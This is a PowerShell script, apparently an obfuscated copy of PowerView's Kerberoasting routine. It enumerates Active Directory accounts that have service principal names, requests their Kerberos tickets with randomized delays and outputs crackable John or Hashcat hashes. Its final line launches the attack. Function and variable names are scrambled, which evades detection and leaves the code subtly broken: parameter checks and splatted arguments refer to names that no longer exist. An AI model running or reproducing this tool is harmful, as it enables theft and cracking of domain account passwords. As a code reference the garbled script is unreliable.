function imperial {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $lEJhjKEI99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $VlsjxWWV99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rnxpXhFv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $LuIpdOeP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $vVyZtrqO99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GnhatUIz99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $DlETQLUc99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $uitlAzkj99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ZmLImeao99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $XTBbuBoF99,
        [Switch]
        $saQsuFES99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $nkZvCTnn99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $NuyUaKVz99 = $lEJhjKEI99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $hlLZIKfV99 = desegregates -Credential $nkZvCTnn99
            }
            else {
                $hlLZIKfV99 = desegregates
            }
            $NuyUaKVz99 = $hlLZIKfV99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($hlLZIKfV99) {
                    $vIXrVkNF99 = $hlLZIKfV99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $vIXrVkNF99 = ((desegregates -Credential $nkZvCTnn99).PdcRoleOwner).Name
                }
                else {
                    $vIXrVkNF99 = ((desegregates).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[imperial] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $vIXrVkNF99 = $GnhatUIz99
        }
        $eJZgfkXf99 = 'LDAP://'
        if ($vIXrVkNF99 -and ($vIXrVkNF99.Trim() -ne '')) {
            $eJZgfkXf99 += $vIXrVkNF99
            if ($NuyUaKVz99) {
                $eJZgfkXf99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $eJZgfkXf99 += $vVyZtrqO99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($LuIpdOeP99 -Match '^GC://') {
                $DN = $LuIpdOeP99.ToUpper().Trim('/')
                $eJZgfkXf99 = ''
            }
            else {
                if ($LuIpdOeP99 -match '^LDAP://') {
                    if ($LuIpdOeP99 -match "LDAP://.+/.+") {
                        $eJZgfkXf99 = ''
                        $DN = $LuIpdOeP99
                    }
                    else {
                        $DN = $LuIpdOeP99.SubString(7)
                    }
                }
                else {
                    $DN = $LuIpdOeP99
                }
            }
        }
        else {
            if ($NuyUaKVz99 -and ($NuyUaKVz99.Trim() -ne '')) {
                $DN = "DC=$($NuyUaKVz99.Replace('.', ',DC='))"
            }
        }
        $eJZgfkXf99 += $DN
        Write-Verbose "[imperial] search string: $eJZgfkXf99"
        if ($nkZvCTnn99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[imperial] Using alternate credentials for LDAP connection"
            $hlLZIKfV99 = New-Object DirectoryServices.DirectoryEntry($eJZgfkXf99, $nkZvCTnn99.UserName, $nkZvCTnn99.GetNetworkCredential().Password)
            $VhvPWKot99 = New-Object System.DirectoryServices.DirectorySearcher($hlLZIKfV99)
        }
        else {
            $VhvPWKot99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$eJZgfkXf99)
        }
        $VhvPWKot99.PageSize = $uitlAzkj99
        $VhvPWKot99.SearchScope = $DlETQLUc99
        $VhvPWKot99.CacheResults = $False
        $VhvPWKot99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $VhvPWKot99.ServerTimeLimit = $ZmLImeao99
        }
        if ($PSBoundParameters['Tombstone']) {
            $VhvPWKot99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $VhvPWKot99.filter = $VlsjxWWV99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $VhvPWKot99.SecurityMasks = Switch ($XTBbuBoF99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $gJkFhUxi99 = $rnxpXhFv99| ForEach-Object { $_.Split(',') }
            $Null = $VhvPWKot99.PropertiesToLoad.AddRange(($gJkFhUxi99))
        }
        $VhvPWKot99
    }
}
function lighters {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $rnxpXhFv99
    )
    $ZXzWanoZ99 = @{}
    $rnxpXhFv99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $ZXzWanoZ99[$_] = $rnxpXhFv99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ZXzWanoZ99[$_] = $rnxpXhFv99[$_][0] -as $vSDknnYC99
            }
            elseif ($_ -eq 'samaccounttype') {
                $ZXzWanoZ99[$_] = $rnxpXhFv99[$_][0] -as $bXlHCwzS99
            }
            elseif ($_ -eq 'objectguid') {
                $ZXzWanoZ99[$_] = (New-Object Guid (,$rnxpXhFv99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ZXzWanoZ99[$_] = $rnxpXhFv99[$_][0] -as $HsjIpdSx99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $qunryyXp99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $rnxpXhFv99[$_][0], 0
                if ($qunryyXp99.Owner) {
                    $ZXzWanoZ99['Owner'] = $qunryyXp99.Owner
                }
                if ($qunryyXp99.Group) {
                    $ZXzWanoZ99['Group'] = $qunryyXp99.Group
                }
                if ($qunryyXp99.DiscretionaryAcl) {
                    $ZXzWanoZ99['DiscretionaryAcl'] = $qunryyXp99.DiscretionaryAcl
                }
                if ($qunryyXp99.SystemAcl) {
                    $ZXzWanoZ99['SystemAcl'] = $qunryyXp99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($rnxpXhFv99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ZXzWanoZ99[$_] = "NEVER"
                }
                else {
                    $ZXzWanoZ99[$_] = [datetime]::fromfiletime($rnxpXhFv99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($rnxpXhFv99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $rnxpXhFv99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ZXzWanoZ99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $ZXzWanoZ99[$_] = ([datetime]::FromFileTime(($rnxpXhFv99[$_][0])))
                }
            }
            elseif ($rnxpXhFv99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $rnxpXhFv99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ZXzWanoZ99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[lighters] error: $_"
                    $ZXzWanoZ99[$_] = $Prop[$_]
                }
            }
            elseif ($rnxpXhFv99[$_].count -eq 1) {
                $ZXzWanoZ99[$_] = $rnxpXhFv99[$_][0]
            }
            else {
                $ZXzWanoZ99[$_] = $rnxpXhFv99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ZXzWanoZ99
    }
    catch {
        Write-Warning "[lighters] Error parsing LDAP properties : $_"
    }
}
function desegregates {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $lEJhjKEI99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $nkZvCTnn99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[desegregates] Using alternate credentials for desegregates'
            if ($PSBoundParameters['Domain']) {
                $NuyUaKVz99 = $lEJhjKEI99
            }
            else {
                $NuyUaKVz99 = $nkZvCTnn99.GetNetworkCredential().Domain
                Write-Verbose "[desegregates] Extracted domain '$NuyUaKVz99' from -Credential"
            }
            $BHGKIwIy99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $NuyUaKVz99, $nkZvCTnn99.UserName, $nkZvCTnn99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($BHGKIwIy99)
            }
            catch {
                Write-Verbose "[desegregates] The specified domain '$NuyUaKVz99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $BHGKIwIy99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $lEJhjKEI99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($BHGKIwIy99)
            }
            catch {
                Write-Verbose "[desegregates] The specified domain '$lEJhjKEI99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[desegregates] Error retrieving the current domain: $_"
            }
        }
    }
}
function abbot {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $NgmMrosm99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $qXclYdrj99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $nkZvCTnn99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $bcUfTTGt99 = Invoke-UserImpersonation -Credential $nkZvCTnn99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $pLiPvCnn99 = $User
        }
        else {
            $pLiPvCnn99 = $SPN
        }
	
	$jHMQLgfc99 = New-Object System.Random
        ForEach ($Object in $pLiPvCnn99) {
            if ($PSBoundParameters['User']) {
                $qrIVdqWr99 = $Object.ServicePrincipalName
                $rJoahPjS99 = $Object.SamAccountName
                $MiMwfueT99 = $Object.DistinguishedName
            }
            else {
                $qrIVdqWr99 = $Object
                $rJoahPjS99 = 'UNKNOWN'
                $MiMwfueT99 = 'UNKNOWN'
            }
            if ($qrIVdqWr99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $qrIVdqWr99 = $qrIVdqWr99[0]
            }
            try {
                $KBMKaEEa99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $qrIVdqWr99
            }
            catch {
                Write-Warning "[abbot] Error requesting ticket for SPN '$qrIVdqWr99' from user '$MiMwfueT99' : $_"
            }
            if ($KBMKaEEa99) {
                $QQkxDGNa99 = $KBMKaEEa99.GetRequest()
            }
            if ($QQkxDGNa99) {
                $Out = New-Object PSObject
                $XYkIoLPP99 = [System.BitConverter]::ToString($QQkxDGNa99) -replace '-'
                if($XYkIoLPP99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $RmUGAckR99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $yybtuyee99 = $Matches.DataToEnd.Substring(0,$RmUGAckR99*2)
                    if($Matches.DataToEnd.Substring($RmUGAckR99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($KBMKaEEa99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($QQkxDGNa99).Replace('-',''))
                    } else {
                        $Hash = "$($yybtuyee99.Substring(0,32))`$$($yybtuyee99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($KBMKaEEa99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($QQkxDGNa99).Replace('-',''))
                }
                if($Hash) {
                    if ($NgmMrosm99 -match 'John') {
                        $dFTfAYPc99 = "`$cqZcOGqw99`$$($KBMKaEEa99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($MiMwfueT99 -ne 'UNKNOWN') {
                            $ConnaRbq99 = $MiMwfueT99.SubString($MiMwfueT99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $ConnaRbq99 = 'UNKNOWN'
                        }
                        $dFTfAYPc99 = "`$cqZcOGqw99`$$($Etype)`$*$rJoahPjS99`$$ConnaRbq99`$$($KBMKaEEa99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $dFTfAYPc99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $rJoahPjS99
                $Out | Add-Member Noteproperty 'DistinguishedName' $MiMwfueT99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $KBMKaEEa99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $jHMQLgfc99.Next((1-$qXclYdrj99)*$Delay, (1+$qXclYdrj99)*$Delay)
        }
    }
    END {
        if ($bcUfTTGt99) {
            Invoke-RevertToSelf -TokenHandle $bcUfTTGt99
        }
    }
}
function especially {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $dtMuCKqA99,
        [Switch]
        $SPN,
        [Switch]
        $MiVxrpiX99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $OKLjiRkk99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $LoiyUCqr99,
        [Switch]
        $nGPGftkp99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $rRXvcCEv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $lEJhjKEI99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $VlsjxWWV99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rnxpXhFv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $LuIpdOeP99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GnhatUIz99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $DlETQLUc99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $uitlAzkj99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ZmLImeao99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $XTBbuBoF99,
        [Switch]
        $saQsuFES99,
        [Alias('ReturnOne')]
        [Switch]
        $rbsPYLSN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $nkZvCTnn99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $iZkzuJyH99 = @{}
        if ($PSBoundParameters['Domain']) { $iZkzuJyH99['Domain'] = $lEJhjKEI99 }
        if ($PSBoundParameters['Properties']) { $iZkzuJyH99['Properties'] = $rnxpXhFv99 }
        if ($PSBoundParameters['SearchBase']) { $iZkzuJyH99['SearchBase'] = $LuIpdOeP99 }
        if ($PSBoundParameters['Server']) { $iZkzuJyH99['Server'] = $GnhatUIz99 }
        if ($PSBoundParameters['SearchScope']) { $iZkzuJyH99['SearchScope'] = $DlETQLUc99 }
        if ($PSBoundParameters['ResultPageSize']) { $iZkzuJyH99['ResultPageSize'] = $uitlAzkj99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $iZkzuJyH99['ServerTimeLimit'] = $ZmLImeao99 }
        if ($PSBoundParameters['SecurityMasks']) { $iZkzuJyH99['SecurityMasks'] = $XTBbuBoF99 }
        if ($PSBoundParameters['Tombstone']) { $iZkzuJyH99['Tombstone'] = $saQsuFES99 }
        if ($PSBoundParameters['Credential']) { $iZkzuJyH99['Credential'] = $nkZvCTnn99 }
        $kvxChywP99 = imperial @SearcherArguments
    }
    PROCESS {
        if ($kvxChywP99) {
            $BkjFcEGj99 = ''
            $bUIAuGkT99 = ''
            $dtMuCKqA99 | Where-Object {$_} | ForEach-Object {
                $mFUXOtBr99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($mFUXOtBr99 -match '^S-1-') {
                    $BkjFcEGj99 += "(objectsid=$mFUXOtBr99)"
                }
                elseif ($mFUXOtBr99 -match '^CN=') {
                    $BkjFcEGj99 += "(distinguishedname=$mFUXOtBr99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $ERebJyyB99 = $mFUXOtBr99.SubString($mFUXOtBr99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[especially] Extracted domain '$ERebJyyB99' from '$mFUXOtBr99'"
                        $iZkzuJyH99['Domain'] = $ERebJyyB99
                        $kvxChywP99 = imperial @SearcherArguments
                        if (-not $kvxChywP99) {
                            Write-Warning "[especially] Unable to retrieve domain searcher for '$ERebJyyB99'"
                        }
                    }
                }
                elseif ($mFUXOtBr99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $tKoSoDYL99 = (([Guid]$mFUXOtBr99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $BkjFcEGj99 += "(objectguid=$tKoSoDYL99)"
                }
                elseif ($mFUXOtBr99.Contains('\')) {
                    $zvDpStzn99 = $mFUXOtBr99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($zvDpStzn99) {
                        $ConnaRbq99 = $zvDpStzn99.SubString(0, $zvDpStzn99.IndexOf('/'))
                        $yzZxLfCU99 = $mFUXOtBr99.Split('\')[1]
                        $BkjFcEGj99 += "(samAccountName=$yzZxLfCU99)"
                        $iZkzuJyH99['Domain'] = $ConnaRbq99
                        Write-Verbose "[especially] Extracted domain '$ConnaRbq99' from '$mFUXOtBr99'"
                        $kvxChywP99 = imperial @SearcherArguments
                    }
                }
                else {
                    $BkjFcEGj99 += "(samAccountName=$mFUXOtBr99)"
                }
            }
            if ($BkjFcEGj99 -and ($BkjFcEGj99.Trim() -ne '') ) {
                $bUIAuGkT99 += "(|$BkjFcEGj99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[especially] Searching for non-null service principal names'
                $bUIAuGkT99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[especially] Searching for users who can be delegated'
                $bUIAuGkT99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[especially] Searching for users who are sensitive and not trusted for delegation'
                $bUIAuGkT99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[especially] Searching for adminCount=1'
                $bUIAuGkT99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[especially] Searching for users that are trusted to authenticate for other principals'
                $bUIAuGkT99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[especially] Searching for user accounts that do not require kerberos preauthenticate'
                $bUIAuGkT99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[especially] Using additional LDAP filter: $VlsjxWWV99"
                $bUIAuGkT99 += "$VlsjxWWV99"
            }
            $ieLDgqVx99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $lkXQKbHx99 = $_.Substring(4)
                    $zajiBisq99 = [Int]($HsjIpdSx99::$lkXQKbHx99)
                    $bUIAuGkT99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$zajiBisq99))"
                }
                else {
                    $zajiBisq99 = [Int]($HsjIpdSx99::$_)
                    $bUIAuGkT99 += "(userAccountControl:1.2.840.113556.1.4.803:=$zajiBisq99)"
                }
            }
            $kvxChywP99.filter = "(&(samAccountType=805306368)$bUIAuGkT99)"
            Write-Verbose "[especially] filter string: $($kvxChywP99.filter)"
            if ($PSBoundParameters['FindOne']) { $SCmZNZdw99 = $kvxChywP99.FindOne() }
            else { $SCmZNZdw99 = $kvxChywP99.FindAll() }
            $SCmZNZdw99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = lighters -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($SCmZNZdw99) {
                try { $SCmZNZdw99.dispose() }
                catch {
                    Write-Verbose "[especially] Error disposing of the Results object: $_"
                }
            }
            $kvxChywP99.dispose()
        }
    }
}
function frillier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $dtMuCKqA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $lEJhjKEI99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $VlsjxWWV99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $LuIpdOeP99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GnhatUIz99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $DlETQLUc99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $uitlAzkj99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ZmLImeao99,
        [Switch]
        $saQsuFES99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $qXclYdrj99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $NgmMrosm99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $nkZvCTnn99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ndbAzCZM99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $ndbAzCZM99['Domain'] = $lEJhjKEI99 }
        if ($PSBoundParameters['LDAPFilter']) { $ndbAzCZM99['LDAPFilter'] = $VlsjxWWV99 }
        if ($PSBoundParameters['SearchBase']) { $ndbAzCZM99['SearchBase'] = $LuIpdOeP99 }
        if ($PSBoundParameters['Server']) { $ndbAzCZM99['Server'] = $GnhatUIz99 }
        if ($PSBoundParameters['SearchScope']) { $ndbAzCZM99['SearchScope'] = $DlETQLUc99 }
        if ($PSBoundParameters['ResultPageSize']) { $ndbAzCZM99['ResultPageSize'] = $uitlAzkj99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ndbAzCZM99['ServerTimeLimit'] = $ZmLImeao99 }
        if ($PSBoundParameters['Tombstone']) { $ndbAzCZM99['Tombstone'] = $saQsuFES99 }
        if ($PSBoundParameters['Credential']) { $ndbAzCZM99['Credential'] = $nkZvCTnn99 }
        if ($PSBoundParameters['Credential']) {
            $bcUfTTGt99 = Invoke-UserImpersonation -Credential $nkZvCTnn99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $ndbAzCZM99['Identity'] = $dtMuCKqA99 }
        especially @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | abbot -Delay $Delay -OutputFormat $NgmMrosm99 -Jitter $qXclYdrj99
    }
    END {
        if ($bcUfTTGt99) {
            Invoke-RevertToSelf -TokenHandle $bcUfTTGt99
        }
    }
}
frillier
